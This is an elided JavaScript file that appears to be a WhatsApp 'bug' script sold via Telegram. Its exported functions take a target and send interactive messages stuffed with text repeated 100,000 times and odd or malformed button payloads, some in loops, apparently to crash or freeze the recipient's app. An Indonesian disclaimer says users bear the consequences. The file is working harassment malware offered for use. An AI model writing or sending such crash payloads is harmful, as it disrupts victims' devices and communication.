/*
  ...
  注意事項 ›
      Gunakan Script Ini Sebijak Dan Sebaik Mungkin, Jangan Menyerang Mereka Yang Tidak Bersalah.
      Konsekuensi Keseluruhan Ditanggung Oleh Pemakai!
   -SkyZet
   

Want To Buy New Update Script?
    Telegram: t.me/KyuuDev
*/
...
const { resize } = require("../../../lib/myfunction")
...
exports.lza = async (KyuuRzy, target) => {
  var buttonBugOldest = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "@ N-Kiuur".repeat(100000),
            subtitle: "@ N-Kiuur".repeat(100000)
          },
          body: {
            text: "@ N-Kiuur".repeat(100000)
          },
          footer: {
          ...
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "{ display_text : ' ~€ N-Kiuur? Wanna Be Yours ', url : , merchant_url :  }"
            }],
  ...
  console.log(warna.blue('───── N-Kiuur ─────'))
  }
}
...
exports.xzeus = async (KyuuRzy, target) => {
    ...
    console.log(warna.brightGreen('───── N-Kiuur ─────'))
}
...
exports.uzc = async (KyuuRzy, target) => {
  ...
  console.log(warna.brightYellow('───── N-Kiuur ─────'))
}
...
exports.locl = async (KyuuRzy, target) => {
 ...
 for (let z = 0; z < 10; z++) {
   ...
   console.log(warna.brightRed('───── N-Kiuur ─────'))
}
                ...
                interactiveMessage: {
                    ...
                    nativeFlowMessage: {
                        ...
                        buttons: [
                            ...
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"N-Kiuur\",\"flow_message_version\":\"9\",\"flow_token\":\"DEVORSIXNZET\"}`,
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}",
                    ...
                    interactiveMessage: {
                        header: {
                            ...
                            documentMessage: {
                                ...
                                fileName: "N-Kiuur - just wanna be yours",
...
for (let i = 0; i < 5; i++) {
    ...
    console.log(warna.cyan('───── N-Kiuur ─────'))
}
...
for (let i = 0; i < 5; i++) {
    ...
    console.log(warna.magenta('───── N-Kiuur ─────'))
}
